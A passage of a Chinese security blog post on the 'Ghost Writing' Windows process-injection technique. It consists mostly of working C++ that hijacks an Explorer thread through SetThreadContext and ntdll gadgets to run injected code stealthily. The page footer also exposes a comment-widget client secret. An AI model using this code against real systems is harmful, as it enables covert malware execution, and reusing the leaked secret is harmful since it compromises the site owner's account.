class="built_in">printf</span>(<span class="string">"Can`t get ntdll handle.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ntdll_code_address = (PUCHAR)((ULONG)ntdll_handle + <span class="number">0x00001000</span>);              <span class="comment">//我们默认ntdll代码起始位置是0x1000</span></span><br><span class="line">    ntdll_peheader_pointer = (PIMAGE_NT_HEADERS)((ULONG)ntdll_handle + ((IMAGE_DOS_HEADER*)ntdll_handle)-&gt;e_lfanew);</span><br><span class="line">    ntdll_code_size = ntdll_peheader_pointer-&gt;OptionalHeader.SizeOfCode;</span><br><span class="line"></span><br><span class="line">    CONTEXT saved_thread_context = &#123; <span class="number">0</span> &#125;;    <span class="comment">//保存被注入的线程环境，用来恢复线程的执行</span></span><br><span class="line">    CONTEXT working_thread_context = &#123; <span class="number">0</span> &#125;;  <span class="comment">//保存注入过程中的线程环境</span></span><br><span class="line"></span><br><span class="line">    DWORD jmp_to_self_address = <span class="number">0</span>, mov_ret_address = <span class="number">0</span>;       <span class="comment">//保存寻找到的 JMP $ 和 MOV + RET的代码地址</span></span><br><span class="line">    ULONG number_of_bytes_to_pop_after_mov_before_ret = <span class="number">0</span>;    <span class="comment">// 保存mov ret代码需要使用的栈大小,因为可能含有POP操作,所以要准确计算需要预留出多少栈空间.</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;  <span class="comment">//用作在ntdll中寻找可用代码时的指针偏移</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//在ntdll中寻找需要得指令</span></span><br><span class="line">    <span class="keyword">while</span> ((i &lt; ntdll_code_size) &amp;&amp; ((!jmp_to_self_address) || (!mov_ret_address))) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!jmp_to_self_address)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((ntdll_code_address[i] == <span class="number">0xEB</span>) &amp;&amp; (ntdll_code_address[i + <span class="number">1</span>] == <span class="number">0xFE</span>))    <span class="comment">// EB FE 检查是不是 JMP $</span></span><br><span class="line">            &#123;</span><br><span class="line">                jmp_to_self_address = (DWORD)&amp;ntdll_code_address[i];</span><br><span class="line">                i += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mov_ret_address)</span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span> (disassemble_and_validate_mov(ntdll_code_address, &amp;i, &amp;working_thread_context, &amp;write_pointer, &amp;write_item, &amp;mov_offset_from_memory_register))</span><br><span class="line">            &#123;</span><br><span class="line">                j = i;</span><br><span class="line">                k = <span class="number">0</span>;<span class="comment">//用来累加mov后到ret的指令需要使用多少栈空间，平栈时使用</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (j &lt; i + <span class="number">16</span>) <span class="comment">//寻找到的mov指令，后续寻找范围16个字节</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (((ntdll_code_address[j] &amp; <span class="number">0xF8</span>) == <span class="number">0x58</span>) &amp;&amp; (ntdll_code_address[j] != <span class="number">0x5C</span>))    <span class="comment">//检查是不是pop指令</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        k += <span class="number">4</span>;</span><br><span class="line">                        j += <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ((ntdll_code_address[j] == <span class="number">0x83</span>) &amp;&amp; ((ntdll_code_address[j + <span class="number">1</span>] &amp; <span class="number">0xF8</span>) == <span class="number">0xC0</span>))    <span class="comment">// 检查是不是 add reg,yy指令</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (ntdll_code_address[j + <span class="number">1</span>] == <span class="number">0xC4</span>)    <span class="comment">//判断reg是不是esp</span></span><br><span class="line">                            k += (<span class="keyword">signed</span> <span class="keyword">char</span>)ntdll_code_address[j + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">                        j += <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ((ntdll_code_address[j] == <span class="number">0xC3</span>) || ((ntdll_code_address[j] == <span class="number">0xC2</span>) &amp;&amp; (ntdll_code_address[j + <span class="number">2</span>] == <span class="number">0x00</span>)))    <span class="comment">// 判断是不是ret指令</span></span><br><span class="line">                    &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (mov_offset_from_memory_register == <span class="number">0</span>)</span><br><span class="line">                            mov_ret_address = (DWORD)&amp;ntdll_code_address[i - <span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">else</span>                                   </span><br><span class="line">                            mov_ret_address = (DWORD)&amp;ntdll_code_address[i - <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">                        number_of_bytes_to_pop_after_mov_before_ret = k;</span><br><span class="line"></span><br><span class="line">                        i = j + <span class="number">3</span>;    <span class="comment">// we increment i so that it points ahead this pattern</span></span><br><span class="line">                        <span class="keyword">break</span>;    <span class="comment">// and we finish the subsearch</span></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;   <span class="comment">//如果不是pop 不是 add reg,yy直接跳出</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//已经取得了要利用得指令片段,我们开始注入!~</span></span><br><span class="line">    <span class="keyword">if</span> ((jmp_to_self_address) &amp;&amp; (mov_ret_address))</span><br><span class="line">    &#123;</span><br><span class="line">        SuspendThread(thread_handle);    <span class="comment">//将目标线程挂起</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//保存两份环境上下文,一份用于恢复执行,另一份用于注入时使用</span></span><br><span class="line">        saved_thread_context.ContextFlags = CONTEXT_FULL;</span><br><span class="line">        working_thread_context.ContextFlags = CONTEXT_FULL;</span><br><span class="line"></span><br><span class="line">        GetThreadContext(thread_handle, &amp;saved_thread_context);</span><br><span class="line">        GetThreadContext(thread_handle, &amp;working_thread_context);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//这时我们要对挂起的线程的栈空间进行设计</span></span><br><span class="line">        <span class="comment">//1.首先我们要修改EIP到MOVRET指令,将JMP$指令设置为当前MOVRET的返回地址,使线程进入自锁状态</span></span><br><span class="line">        <span class="comment">//2.当线程进入自锁状态后,要使用 NtProtectVirtualMemory 函数去修改接下来一块栈空间的内存属性,因为我们要在这块内存中执行InjectCode</span></span><br><span class="line">        <span class="comment">//3.执行InjectCode</span></span><br><span class="line">        <span class="comment">//所以,我们设计的栈空间需要包括,MOVRET指令需要的栈空间 + JMP$地址 + NtProtectVirtualMemory使用的栈空间 + InjectCode</span></span><br><span class="line">        <span class="comment">//如下图:</span></span><br><span class="line">        <span class="comment">//  初始的栈                                        修改后的栈</span></span><br><span class="line">        <span class="comment">//  ____________________                         ______________________</span></span><br><span class="line">        <span class="comment">// |                    |&lt;--- 栈底              |                      |&lt;--- 栈底</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |______________________|</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |&lt;--- ESP</span></span><br><span class="line">        <span class="comment">// |                    |                       | MOVRET使用的栈空间   |</span></span><br><span class="line">        <span class="comment">// |                    |                       |______________________|</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |    JMP$指令地址      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |______________________|</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |NtProtectVirtualMemory|</span></span><br><span class="line">        <span class="comment">// |                    |                       |       使用栈         |</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |______________________|</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |    Inject Code       |</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |____________________|                       |______________________|</span></span><br><span class="line">        <span class="comment">// |                    |&lt;--- ESP               |                      |&lt;--- 原ESP</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// | 原程序已经使用的栈 |                       | 原程序已经使用的栈   |</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |                    |                       |                      |</span></span><br><span class="line">        <span class="comment">// |____________________|&lt;--- 栈顶              |______________________|&lt;--- 栈顶</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//拉出一部份我们将要使用的栈空间</span></span><br><span class="line">        DWORD base_of_written_bytes;</span><br><span class="line">        base_of_written_bytes = working_thread_context.Esp - ((number_of_dwords_to_inject * <span class="keyword">sizeof</span>(DWORD)) + <span class="comment">//Inject Code </span></span><br><span class="line">                                                               ((<span class="number">1</span> + <span class="number">5</span> + <span class="number">3</span>) * <span class="keyword">sizeof</span>(DWORD)) +                <span class="comment">//NtProtectVirtualMemory参数+返回地址 这里的1 5 3 在后面解释</span></span><br><span class="line">                                                               <span class="keyword">sizeof</span>(DWORD) +                                <span class="comment">//lpJMP$</span></span><br><span class="line">                                                               number_of_bytes_to_pop_after_mov_before_ret);  <span class="comment">//MOVRET使用的栈</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//首先 将JMP$地址写入指定位置用于MOVREG指令的返回值,让程序执行完MOVRET指令后进入自锁状态</span></span><br><span class="line">        * write_pointer = base_of_written_bytes - mov_offset_from_memory_register + number_of_bytes_to_pop_after_mov_before_ret;      <span class="comment">//指定MOV [REG1],REG2的目标操作数(考虑到了MOV [REG1+xx],REG2需要添加xx偏移)</span></span><br><span class="line">        working_thread_context.Esp = base_of_written_bytes;</span><br><span class="line">        working_thread_context.Eip = mov_ret_address;</span><br><span class="line">        *write_item = jmp_to_self_address;</span><br><span class="line">        wait_for_thread_autolock(thread_handle, &amp;working_thread_context, thread_window_handle, jmp_to_self_address);<span class="comment">//执行线程，写入返回地址，并返回到写入的JMP $,函数返回</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//然后构造NtProtectVirtualMemory所使用的栈空间</span></span><br><span class="line">        <span class="comment">// NtProtectVirtualMemory(    IN HANDLE ProcessHandle,</span></span><br><span class="line">        <span class="comment">//                            IN OUT PVOID *BaseAddress,</span></span><br><span class="line">        <span class="comment">//                            IN OUT PULONG NumberOfBytesToProtect,</span></span><br><span class="line">        <span class="comment">//                            IN ULONG NewAccessProtection,</span></span><br><span class="line">        <span class="comment">//                            OUT PULONG OldAccessProtection );</span></span><br><span class="line">        <span class="comment">//得知我们需要1个返回值+5个参数+3个指针参数指向的数据,所以栈空间使这样的</span></span><br><span class="line">        <span class="comment">// | RET ADDR           |</span></span><br><span class="line">        <span class="comment">// | p.1: ProcessHandle |</span></span><br><span class="line">        <span class="comment">// | p.2: &amp;BaseAddress -----------.</span></span><br><span class="line">        <span class="comment">// | p.3: &amp;NumBytesProt --------. |</span></span><br><span class="line">        <span class="comment">// | p.4: NewAccessProt |       | |</span></span><br><span class="line">        <span class="comment">// | p.5: &amp;OldAccessPrt ----.   | |</span></span><br><span class="line">        <span class="comment">// | BaseAddress        |&lt;--+---+-.</span></span><br><span class="line">        <span class="comment">// | NumBytesProt       |&lt;--+---.</span></span><br><span class="line">        <span class="comment">// | OldAccessPrt       |&lt;--.</span></span><br><span class="line"></span><br><span class="line">        DWORD NtProtectVirtualMemory_call_stack[<span class="number">1</span> + <span class="number">5</span> + <span class="number">3</span>] = &#123; <span class="number">0</span>,           <span class="comment">// 返回地址，我们要将这个地址修改成 JMP $的地址</span></span><br><span class="line">                                                    <span class="number">0xFFFFFFFF</span>,             <span class="comment">// ProcessHandle</span></span><br><span class="line">                                                    <span class="number">0</span>,                      <span class="comment">// &amp;BaseAddress</span></span><br><span class="line">                                                    <span class="number">0</span>,                      <span class="comment">// &amp;NumBytesProt</span></span><br><span class="line">                                                    PAGE_EXECUTE_READWRITE, <span class="comment">// NewAccessProt</span></span><br><span class="line">                                                    <span class="number">0</span>,                      <span class="comment">// &amp;OldAccessPrt</span></span><br><span class="line">                                                    <span class="number">0</span>,                      <span class="comment">// BaseAddress</span></span><br><span class="line">                                                    <span class="number">0</span>,                      <span class="comment">// NumBytesProt</span></span><br><span class="line">                                                    <span class="number">0</span> &#125;;                    <span class="comment">// OldAccessPrt</span></span><br><span class="line"></span><br><span class="line">        NtProtectVirtualMemory_call_stack[<span class="number">0</span>] = jmp_to_self_address;</span><br><span class="line">        NtProtectVirtualMemory_call_stack[<span class="number">2</span>] = base_of_written_bytes + number_of_bytes_to_pop_after_mov_before_ret + <span class="keyword">sizeof</span>(DWORD) + ((<span class="number">1</span> + <span class="number">5</span> + <span class="number">0</span>) * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">        NtProtectVirtualMemory_call_stack[<span class="number">3</span>] = base_of_written_bytes + number_of_bytes_to_pop_after_mov_before_ret + <span class="keyword">sizeof</span>(DWORD) + ((<span class="number">1</span> + <span class="number">5</span> + <span class="number">1</span>) * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">        NtProtectVirtualMemory_call_stack[<span class="number">5</span>] = base_of_written_bytes + number_of_bytes_to_pop_after_mov_before_ret + <span class="keyword">sizeof</span>(DWORD) + ((<span class="number">1</span> + <span class="number">5</span> + <span class="number">2</span>) * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">        NtProtectVirtualMemory_call_stack[<span class="number">6</span>] = base_of_written_bytes + number_of_bytes_to_pop_after_mov_before_ret + <span class="keyword">sizeof</span>(DWORD) + ((<span class="number">1</span> + <span class="number">5</span> + <span class="number">3</span>) * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">        NtProtectVirtualMemory_call_stack[<span class="number">7</span>] = number_of_dwords_to_inject * <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//然后利用MOVRET把这9个DWORD写到栈中</span></span><br><span class="line">        DWORD DWORD_writing_pointer = <span class="number">0</span>;</span><br><span class="line">        DWORD_writing_pointer = base_of_written_bytes + number_of_bytes_to_pop_after_mov_before_ret + <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            working_thread_context.Esp = base_of_written_bytes;</span><br><span class="line">            *write_pointer = DWORD_writing_pointer - mov_offset_from_memory_register;</span><br><span class="line">            *write_item = NtProtectVirtualMemory_call_stack[i];</span><br><span class="line">            working_thread_context.Eip = mov_ret_address;</span><br><span class="line">            wait_for_thread_autolock(thread_handle, &amp;working_thread_context, thread_window_handle, jmp_to_self_address);</span><br><span class="line">            DWORD_writing_pointer += <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//接下来将Injectcode也写入到预留好的栈当中</span></span><br><span class="line">        DWORD InjectedCodeExecutionStart;</span><br><span class="line">        InjectedCodeExecutionStart = DWORD_writing_pointer;     	<span class="comment">//准备执行Inject Code时使用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//写入injected code</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; number_of_dwords_to_inject;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            working_thread_context.Esp = base_of_written_bytes;</span><br><span class="line">            *write_pointer = DWORD_writing_pointer - mov_offset_from_memory_register;</span><br><span class="line">            *write_item = injected_code[i];</span><br><span class="line">            working_thread_context.Eip = mov_ret_address;</span><br><span class="line">            wait_for_thread_autolock(thread_handle, &amp;working_thread_context, thread_window_handle, jmp_to_self_address);</span><br><span class="line">            DWORD_writing_pointer += <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//内存数据都准备好了,可以开始执行了,先执行NtProtectVirtualMemory</span></span><br><span class="line">        working_thread_context.Esp = base_of_written_bytes + number_of_bytes_to_pop_after_mov_before_ret + <span class="keyword">sizeof</span>(DWORD); </span><br><span class="line">        working_thread_context.Eip = NtProtectVirtualMemory_address;</span><br><span class="line">        wait_for_thread_autolock(thread_handle, &amp;working_thread_context, thread_window_handle, jmp_to_self_address);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//再执行InjectCode,也可以进行优化,将NtProtectVirtualMemory的返回地址直接指向InjectCode的起始位置</span></span><br><span class="line">        working_thread_context.Esp = base_of_written_bytes;</span><br><span class="line">        working_thread_context.Esi = jmp_to_self_address;</span><br><span class="line">        working_thread_context.Ebx = base_of_written_bytes;</span><br><span class="line">        working_thread_context.Eip = InjectedCodeExecutionStart;</span><br><span class="line">        wait_for_thread_autolock(thread_handle, &amp;working_thread_context, thread_window_handle, jmp_to_self_address);    <span class="comment">// and... RUN !!!</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//我们的payload也被设计成返回到JMP$,所以当wait_for_thread_autolock函数返回,就可以恢复线程原来的状态了.</span></span><br><span class="line"></span><br><span class="line">        SetThreadContext(thread_handle, &amp;saved_thread_context);</span><br><span class="line">        ResumeThread(thread_handle);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完美!所有核心部分都已经完成,最后拼装一下.  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//在user32.dll中获取MessageBoxA的函数地址</span></span><br><span class="line">    DWORD messageboxa_address = <span class="number">0</span>;</span><br><span class="line">    HMODULE user32_handle = LoadLibraryA(<span class="string">"USER32.DLL"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!user32_handle)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Can`t get user32 handle.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        messageboxa_address = (DWORD)GetProcAddress(user32_handle, <span class="string">"MessageBoxA"</span>);</span><br><span class="line">        FreeLibrary(user32_handle);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!messageboxa_address)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Can`t get MessageBoxA address.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        *(DWORD*)(&amp;injcted_code[<span class="number">58</span>]) = messageboxa_address;		<span class="comment">//填充inject code中的函数地址</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//利用GetShellWindow去获得Explorer的线程句柄</span></span><br><span class="line">    HWND shellwindow_handle = <span class="number">0</span>;</span><br><span class="line">    shellwindow_handle = GetShellWindow();</span><br><span class="line">    <span class="keyword">if</span> (!shellwindow_handle)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Can`t get Shell window handle.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD shellwindow_thread_id = <span class="number">0</span>;</span><br><span class="line">    shellwindow_thread_id = GetWindowThreadProcessId(shellwindow_handle, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!shellwindow_thread_id)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Can`t get Shell windows thread id.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HANDLE target_thread_handle = <span class="number">0</span>;</span><br><span class="line">    target_thread_handle = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, shellwindow_thread_id);</span><br><span class="line">    <span class="keyword">if</span> (!target_thread_handle)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Can`t get target thread handle.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对目标线程进行注入</span></span><br><span class="line">    <span class="keyword">if</span> (inject(target_thread_handle, (DWORD*)injcted_code, (<span class="keyword">sizeof</span>(injcted_code) + <span class="number">4</span>) / <span class="number">4</span>, shellwindow_handle))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Ghost writing success.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Ghost writing failure.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>完成！神不知鬼不觉~ 最后上个效果图！  </p>
+<p><img src="/pic/iab/ProcessInject_2/TEST.gif" alt=""></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这种注入方式使用了大量的SetThreadContext来控制代码组成ROP链,代替传统得写操作,和执行操作,相比上古时期的CreatRemoteThread显得十分有趣,虽然时间上也很久远,但是在如今仍然非常有效,并且完全可以修改成X64的版本,而且不需要高权限,可以在现如今大部分windows版本上运行.  </p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>iaB
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://cxvhacker.github.io/2021/02/26/iab/ProcessInject_2/" title="Windows进程注入技术总结(二)">https://cxvhacker.github.io/2021/02/26/iab/ProcessInject_2/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Inject/" rel="tag"># Inject</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/02/22/zhanghao/%E5%BC%82%E5%B8%B8%E4%BF%A1%E5%8F%B7%E6%A3%80%E6%B5%8B/" rel="prev" title="异常信号检测论文简介">
+      <i class="fa fa-chevron-left"></i> 异常信号检测论文简介
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#原理简述"><span class="nav-number">2.</span> <span class="nav-text">原理简述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ghost-Writing"><span class="nav-number">3.</span> <span class="nav-text">Ghost-Writing</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">vhacker</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">vhacker</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '399537cdb54292e355a4',
+      clientSecret: '1d1c2f5009f3f64de8bdb96fe07481045f835d06',
+      repo        : 'cxvhacker.github.io',
+      owner       : 'cxvhacker',
+      admin       : ['cxvhacker'],
